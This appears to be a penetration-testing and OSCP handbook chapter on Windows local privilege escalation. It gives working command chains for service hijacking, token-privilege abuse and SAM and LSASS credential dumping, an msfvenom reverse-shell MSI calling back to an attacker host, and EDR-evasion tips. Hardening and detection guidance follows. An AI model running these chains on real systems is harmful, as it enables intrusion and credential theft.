## 1. Overview

Windows local privilege escalation (LPE) is the process of moving from
a low-privileged user context (or a service account) to SYSTEM (or
local Administrator). The vectors are well-known, stable across
Windows versions, and frequently present in real environments.

**Vector families:**

- **Service misconfigurations** - unquoted paths, weak ACLs, writable
  binaries.
- **Token privileges** - SeImpersonate, SeAssignPrimaryToken,
  SeDebug, SeBackup, SeTakeOwnership, SeLoadDriver.
- **DLL hijacking** - search-order, phantom, side-loading.
- **Registry** - AlwaysInstallElevated, AutoRun keys, IFEO.
- **Credentials** - autologon, Unattend, config files, GPP cpassword
  (see `01 Active Directory / 04 Credential Abuse`).
- **Kernel and drivers** - unpatched CVEs, BYOVD.
- **Applications** - vulnerable services, named pipes, COM objects,
  WSUS, SCCM.

**Target outcome:** `nt authority\system` (highest), or a member of
the local `Administrators` group.

## 2. Reconnaissance / Enumeration

**Offensive - privilege and token check (always first):**

    whoami /all

    # Look for these privileges:
    #   SeImpersonatePrivilege           -> potato attacks
    #   SeAssignPrimaryTokenPrivilege    -> token impersonation
    #   SeDebugPrivilege                 -> LSASS dump
    #   SeBackupPrivilege                -> read any file
    #   SeRestorePrivilege               -> write any file
    #   SeTakeOwnershipPrivilege         -> take ownership
    #   SeLoadDriverPrivilege            -> load a driver

**Offensive - service enumeration:**

    # All services with binary paths and accounts
    wmic service get Name,DisplayName,PathName,StartMode,StartName

    # Unquoted service paths (excluding Windows directory)
    wmic service get Name,DisplayName,PathName,StartMode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """"

    # Service ACLs (accesschk.exe from Sysinternals)
    accesschk.exe /accepteula -uwcqv "Everyone" *
    accesschk.exe /accepteula -uwcqv "Users" *
    accesschk.exe /accepteula -uwcqv "Authenticated Users" *

    # Non-Microsoft services with non-standard paths
    Get-Service | Where-Object { $_.PathName -notmatch 'System32|SysWOW64' -and $_.DisplayName -notmatch 'Microsoft' }

**Offensive - token privileges:**

    # Detailed token information
    whoami /priv
    whoami /groups

    # Check for privileges that can be abused
    # A user with SeImpersonate is a candidate for potato attacks.
    # A user with SeDebug is a candidate for LSASS dump.
    # A user with SeBackup is a candidate for SAM/SYSTEM dump.

**Offensive - registry:**

    # AlwaysInstallElevated (both HKLM and HKCU must be 0x1)
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # Autologon credentials
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

    # AutoRun keys
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    # IFEO (Image File Execution Options) - debugger hijack
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

**Offensive - files:**

    # Writable service binaries
    Get-ChildItem -Path "C:\Program Files","C:\Program Files (x86)" -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq '.exe' } | ForEach-Object { $acl = Get-Acl $_.FullName; if ($acl.Access | Where-Object { $_.IdentityReference -match 'Users|Authenticated' -and $_.FileSystemRights -match 'Write|Modify|FullControl' }) { Write-Host $_.FullName } }

    # Credentials in files
    findstr /si password *.xml *.ini *.txt *.config *.conf *.json
    type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

    # Unattend / sysprep
    dir /s /b C:\unattend.xml C:\Windows\Panther\*.xml C:\Windows\System32\sysprep\*.xml 2>nul

**Offensive - automated:**

    .\winPEASx64.exe
    .\Seatbelt.exe -group=all
    Import-Module .\PowerUp.ps1; Invoke-AllChecks
    .\SharpUp.exe audit

## 3. Common Attack Vectors

**Vector selection matrix:**

| Vector | Prerequisite | Noise | Reliability |
|--------|--------------|-------|-------------|
| Credentials in files | Read access | None | High |
| Autologon / Unattend | Read access to registry/files | None | High |
| AlwaysInstallElevated | Both registry keys set | Medium | High |
| Weak service ACL | Users has CHANGE_CONFIG | High | High |
| Unquoted service path | Writable parent dir | High | Medium |
| Writable service binary | Write access to the exe | High | High |
| SeImpersonate | Privilege present | Medium | High |
| SeDebug | Privilege present | High | High |
| SeBackup | Privilege present | Low | High |
| DLL hijacking | Writable dir in search path | Medium | Medium |
| Kernel exploit | Unpatched CVE | Very high | Low-medium |
| Application exploit | Vulnerable app + version | Medium | Depends |

**Preferred order (silent to loud):**

1. Credentials in files.
2. Autologon / Unattend / registry credentials.
3. SeBackup / SeDebug / SeTakeOwnership (if present).
4. SeImpersonate (if present).
5. Weak service ACL / writable service binary.
6. Unquoted service path.
7. AlwaysInstallElevated.
8. DLL hijacking.
9. Application exploit.
10. Kernel exploit (last resort).

## 4. Exploitation Recipes

**Unquoted service path - full chain:**

    # 1. Find unquoted service paths
    wmic service get Name,DisplayName,PathName,StartMode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """"

    # Example vulnerable path:
    # C:\Program Files\Vuln App\service.exe

    # Windows tries (in order):
    #   C:\Program.exe
    #   C:\Program Files\Vuln.exe
    #   C:\Program Files\Vuln App\service.exe

    # 2. Check write permission on the parent directory
    icacls "C:\Program Files\Vuln App"

    # 3. If writable, place a payload at the right prefix
    copy payload.exe "C:\Program Files\Vuln.exe"

    # 4. Restart the service (requires restart permission)
    sc stop VulnService
    sc start VulnService

    # Expected output:
    # [SC] StartService FAILED 1053: The service did not respond...
    # (This is expected if the payload is a reverse shell.)

    # 5. Catch the reverse shell on the attacker's listener.

**Weak service ACL - full chain:**

    # 1. Find services with weak ACLs
    accesschk.exe /accepteula -uwcqv "Users" *

    # Example vulnerable output:
    # RW VulnService
    #     SERVICE_QUERY_STATUS
    #     SERVICE_QUERY_CONFIG
    #     SERVICE_CHANGE_CONFIG
    #     SERVICE_START
    #     SERVICE_STOP

    # 2. Reconfigure the service binary path
    sc config VulnService binPath= "C:\Windows\Temp\payload.exe"
    sc stop VulnService
    sc start VulnService

    # Expected output:
    # [SC] ChangeServiceConfig SUCCESS
    # [SC] StartService FAILED 1053: The service did not respond...

    # 3. Catch the reverse shell.

**SeImpersonate -> GodPotato (recommended on modern Windows):**

    # 1. Confirm the privilege
    whoami /priv | findstr SeImpersonate

    # 2. Upload GodPotato.exe
    .\GodPotato.exe -cmd "cmd /c whoami"

    # Expected output:
    # nt authority\system

    # 3. Get a shell
    .\GodPotato.exe -cmd "cmd /c powershell -e <BASE64_PAYLOAD>"

**SeImpersonate -> PrintSpoofer (Server 2016/2019):**

    .\PrintSpoofer.exe -i -c cmd

    # Expected output:
    # [+] Found privilege: SeImpersonatePrivilege
    # [+] Named pipe listening...
    # [+] CreateProcessAsUser() PID: <PID> CreateProcess() Token: 0x...
    # nt authority\system

**SeImpersonate -> RoguePotato (requires a Linux redirector):**

    # On the attacker (Linux): start a socat redirector
    socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999

    # On the target:
    .\RoguePotato.exe -r <ATTACKER_IP> -e "cmd /c whoami" -l 9999

**SeBackupPrivilege - dump SAM and SYSTEM:**

    # 1. Confirm the privilege
    whoami /priv | findstr SeBackup

    # 2. Use robocopy with /b (backup mode) to copy SAM and SYSTEM
    robocopy /b C:\Windows\System32\config C:\Windows\Temp SAM
    robocopy /b C:\Windows\System32\config C:\Windows\Temp SYSTEM

    # Or with reg save (works with SeBackupPrivilege):
    reg save HKLM\SAM C:\Windows\Temp\SAM
    reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

    # 3. Exfiltrate and extract hashes
    secretsdump.py -sam SAM -system SYSTEM LOCAL

    # Expected output:
    # Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
    # (LM hash is <LM_HASH_EMPTY> = empty)

**SeDebugPrivilege - dump LSASS:**

    # 1. Confirm the privilege
    whoami /priv | findstr SeDebug

    # 2. Dump LSASS memory
    procdump.exe -accepteula -ma lsass.exe lsass.dmp

    # Or with comsvcs.dll (built-in, often less flagged):
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full

    # 3. Extract credentials with pypykatz (offline)
    pypykatz lsa minidump lsass.dmp

**AlwaysInstallElevated - full chain:**

    # 1. Confirm both registry keys
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # Both must return 0x1.

    # 2. Generate a malicious MSI on the attacker
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o payload.msi

    # 3. Upload and install
    msiexec /quiet /qn /i C:\Windows\Temp\payload.msi

**Autologon credentials - full chain:**

    # 1. Read the credentials
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

    # Expected output:
    # DefaultUserName    REG_SZ    Administrator
    # DefaultPassword    REG_SZ    <PASSWORD>

    # 2. Use the credentials locally or remotely
    runas /user:Administrator cmd
    # Or:
    netexec smb <TARGET> -u Administrator -p <PASSWORD>

**Unattend.xml - full chain:**

    # 1. Find Unattend.xml
    dir /s /b C:\unattend.xml C:\Windows\Panther\*.xml C:\Windows\System32\sysprep\*.xml 2>nul

    # 2. Read it
    type C:\Windows\Panther\Unattend.xml

    # Expected content:
    # <UserAccounts>
    #   <LocalAccounts>
    #     <LocalAccount wcm:action="add">
    #       <Password>
    #         <Value>BASE64_PASSWORD</Value>
    #         <PlainText>false</PlainText>
    #       </Password>
    #       <Description>Local Administrator</Description>
    #       <Name>Administrator</Name>
    #     </LocalAccount>
    #   </LocalAccounts>
    # </UserAccounts>

    # 3. Decode the base64 password
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_PASSWORD"))

**DLL hijacking - missing DLL:**

    # 1. Enumerate processes and their loaded DLLs
    # Procmon (from Sysinternals) filters NAME NOT FOUND for .dll

    # 2. If a process running as SYSTEM tries to load a DLL from a
    #    writable directory, place a malicious DLL there.
    #    Name it exactly as the missing DLL.

    # 3. Trigger the process (restart the service, log in, etc.)

## 5. Post-Exploitation

**After escalating to SYSTEM:**

- Dump LSASS for cleartext passwords and hashes.
- Dump SAM and LSA secrets.
- Enumerate local admin sessions and cached credentials.
- Search for credentials in files again (the new context may have
  access to files that were previously inaccessible).
- Enumerate scheduled tasks and services for persistence.
- Enumerate shares reachable as SYSTEM (may be different from user).
- Pivot to the domain (see `01 Active Directory`).

**Persistence as SYSTEM:**

- Create a service.
- Create a scheduled task.
- Add a Run key in HKLM.
- WMI event subscription.
- Add a local admin user.

**After escalating to local Administrator (non-SYSTEM):**

- UAC bypass to reach High integrity (if needed).
- Then use the same techniques as SYSTEM.

## 6. Risk Context

Windows LPE is a reliable path to SYSTEM in most environments because
the misconfigurations that enable it are extremely common:

- Legacy installers create unquoted service paths and weak ACLs.
- Service accounts frequently have SeImpersonate.
- Administrators frequently enable AlwaysInstallElevated for
  convenience.
- Autologon and Unattend.xml are common in unattended deployments.

**Blast radius:** SYSTEM on a member server often grants access to
domain credentials (LSASS, cached credentials). SYSTEM on a
workstation often grants access to user data and pivot points.

**Why attacks succeed:**

- Misconfigurations persist for years.
- EDR is often absent on servers.
- Administrators underestimate the impact of local admin.
- Service accounts are over-privileged.

## 7. Root Causes

- **Legacy installers.** Unquoted paths, weak ACLs.
- **Default insecure configurations.** AlwaysInstallElevated,
  autologon.
- **Over-privileged service accounts.** SeImpersonate on IIS, MSSQL.
- **Credentials in plaintext.** Autologon, Unattend, config files.
- **Missing patches.** Kernel vulnerabilities.
- **Writable system directories.** Non-admin principals with write
  access.
- **No baseline.** Misconfigurations are invisible without a baseline.

## 8. Preventive Controls

**Service hardening:**

- Quote all service paths.
- Restrict service ACLs to administrators.
- Install services in admin-only directories.
- Use dedicated service accounts (not LocalSystem).

**Privilege hardening:**

- Remove SeImpersonate from service accounts where possible.
- Restrict SeDebug to administrators.
- Use Protected Users for privileged accounts.

**Registry hardening:**

- Disable autologon.
- Disable AlwaysInstallElevated.
- Restrict write access to AutoRun keys.
- Enable LSA Protection (RunAsPPL).

**Credential hygiene:**

- Remove Unattend.xml from deployed systems.
- Do not store plaintext passwords in config files.
- Use managed service accounts (gMSA).
- Enable Credential Guard.

**Patch management:**

- Patch kernel vulnerabilities within days.
- Remove or update legacy drivers.
- Use WDAC / AppLocker.

**Monitoring:**

- Enable PowerShell script block logging.
- Enable Sysmon with a modern configuration.
- Baseline and alert on service creation, task creation, registry
  changes.

## 9. Detection Controls

**Service misconfiguration exploitation:**

- Event 7045 (service installed) - new services.
- Event 4697 (service installed via API).
- Event 4688 with `sc.exe config`, `sc.exe start`.
- Sysmon event 13 (registry set) on service keys.

**Token privilege abuse:**

- Event 4672 (special privileges assigned) - monitor for
  SeImpersonate, SeDebug.
- Event 4688 with `GodPotato`, `PrintSpoofer`, `RoguePotato`.
- Sysmon event 1 with parent `services.exe` or `w3wp.exe` spawning
  a shell.

**LSASS access:**

- Event 4656 / 4663 (handle to LSASS).
- Event 4688 with `procdump`, `comsvcs.dll`, `mimikatz`.
- Sysmon event 10 (process access) with target `lsass.exe`.

**AlwaysInstallElevated:**

- Event 4688 with `msiexec.exe` from a non-admin context.
- Event 1040 (MSI installation).

**Registry persistence / privesc:**

- Event 4657 (registry value modified).
- Sysmon event 12 / 13 / 14.
- Alert on modifications to Winlogon, Run, IFEO.

**Kernel exploit:**

- Event 4688 with unusual binaries in Temp, ProgramData.
- Sysmon event 11 (file create) with unusual paths.
- Crash dumps (Event 1001 BugCheck).

**General:**

- Honeytokens: fake credentials in config files, fake admin accounts.
- Baseline normal service and task creation; alert on anomalies.

## 10. Verification

**Offensive - did LPE succeed?**

- `whoami` returns `nt authority\system` or a member of
  `Administrators`.
- Check: `whoami /groups | findstr Administrators`.
- If UAC is involved, `whoami /groups | findstr Mandatory` shows
  `High Mandatory Level`.

**Defensive - are controls effective?**

- No unquoted service paths (`wmic service get PathName` all quoted).
- No weak service ACLs (`accesschk -uwcqv Users *` returns nothing).
- No service accounts with SeImpersonate beyond documented exceptions.
- AlwaysInstallElevated disabled in both HKLM and HKCU.
- Autologon disabled (`DefaultPassword` key absent).
- No Unattend.xml on disk.
- All patches current within 30 days.
- LSASS protected (RunAsPPL enabled).
- Credential Guard enabled on supported hardware.

## 11. OSCP Notes

- Windows LPE is a common OSCP requirement. Practice each vector.
- Preferred tools: winPEAS, Seatbelt, PowerUp, SharpUp, accesschk.
- Preferred exploits: GodPotato, PrintSpoofer, JuicyPotato (older),
  msfvenom-generated MSI for AlwaysInstallElevated.
- **Capture screenshots** of:
  - `whoami /priv` showing the abused privilege.
  - The misconfiguration (unquoted path, weak ACL, registry key).
  - The exploitation command and the resulting SYSTEM shell.
  - `whoami` output as SYSTEM.
- The `> [!IMPORTANT]` OSCP reporting note applies to the LPE step.

## 12. Production Notes

- GodPotato and PrintSpoofer are heavily signatured; modern EDR blocks
  them at runtime.
- Use variants (SharpEfsPotato, SweetPotato) or custom loaders.
- LSASS dump via `comsvcs.dll` is also heavily signatured; consider
  indirect syscalls or PPL bypasses.
- Kernel exploits are very loud and may crash the system; use as last
  resort.
- Credential hunting in files is the quietest vector; prioritize it.
- Assume EDR is present on servers in mature environments; plan
  accordingly.

## 13. References

**Microsoft documentation:**

- Windows Security Documentation - https://learn.microsoft.com/en-us/windows/security/
- Service Control Manager - https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager
- Access Tokens - https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens

**MITRE ATT&CK:**

- Privilege Escalation - Exploitation for Privilege Escalation (T1068) - https://attack.mitre.org/techniques/T1068/
- Privilege Escalation - Access Token Manipulation (T1134) - https://attack.mitre.org/techniques/T1134/
- Privilege Escalation - Hijack Execution Flow (T1574) - https://attack.mitre.org/techniques/T1574/
- Privilege Escalation - Boot or Logon Autostart Execution (T1547) - https://attack.mitre.org/techniques/T1547/

**Tools:**

- GodPotato - https://github.com/BeichenDream/GodPotato
- PrintSpoofer - https://github.com/itm4n/PrintSpoofer
- JuicyPotato - https://github.com/ohpe/juicy-potato
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- SharpUp - https://github.com/GhostPack/SharpUp
- accesschk - https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
- pypykatz - https://github.com/skelsec/pypykatz

**Research:**

- HackTricks - Windows Local Privilege Escalation - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings - Windows Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- FuzzySecurity - Windows Privilege Escalation Fundamentals - https://fuzzysecurity.com/tutorials/16.html
- itm4n - Windows Privilege Escalation - https://itm4n.github.io/
